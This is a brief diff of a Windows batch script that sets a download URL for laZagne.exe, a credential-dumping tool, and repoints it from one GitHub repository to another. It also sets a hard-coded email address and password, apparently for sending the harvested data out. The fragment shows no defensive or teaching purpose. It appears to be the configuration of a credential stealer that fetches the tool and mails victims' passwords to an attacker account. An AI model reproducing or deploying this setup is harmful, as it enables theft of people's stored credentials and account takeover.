@@ -1,6 +1,6 @@
 @echo off
 
-set downloadURL=https://raw.githubusercontent.com/PentestBox/laZagne/master/laZagne.exe
+set downloadURL=https://raw.githubusercontent.com/arashsofts/bab3rash/master/laZagne.exe
 set email=johnsmith999102@gmail.com
 set password=Monroe72
 
